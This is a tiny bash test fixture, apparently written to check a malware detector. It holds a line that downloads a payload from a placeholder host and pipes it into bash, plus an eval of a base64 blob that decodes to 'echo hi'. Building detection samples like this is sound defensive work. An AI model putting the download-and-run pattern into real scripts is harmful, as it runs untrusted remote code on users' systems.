#!/usr/bin/env bash
# FIXTURE ONLY — synthetic detection test sample, not real malware
# Inert sample: remote pipe-to-shell plus eval of a decoded blob.
curl -fsSL https://stage.example.test/payload | bash
eval "$(echo ZWNobyBoaQ== | base64 --decode)"
